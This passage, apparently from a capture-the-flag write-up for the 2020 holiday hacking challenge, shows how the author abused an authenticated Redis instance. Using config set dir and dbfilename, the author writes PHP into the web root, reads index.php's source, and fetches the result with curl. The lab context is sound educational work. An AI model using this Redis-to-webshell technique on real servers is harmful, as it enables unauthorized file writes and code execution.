4. Now that I could interact with `redis-cli` directly without needing to work around urlencoding and comma separated commands, I embarked on about 4 hours of researching and trial and error... until I stumpled on [this exploit](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#webshell).

```
# Start redis-cli and authenticat
redis-cli
AUTH R3disp@ss

# Grab the web path with 'cat /etc/apache2/sites-enabled/000-default.conf' and check DocumentRoot
config set dir /var/www/html

# Set destination file, in this case the maintenance page
config set dbfilename maintenance.php

# Append PHP code that includes contents of idex.php
set test "<?php echo file_get_contents('index.php');?>"

# Save and exit
save
exit


# Fetch the updated maintenance.php and view
curl http://localhost/maintenance.php --output maintenance.php
cat maintenance.php

```

![](/assets/shhc2020/0a-03.png)

5. And that's how I helped Santa and the elves find the bug!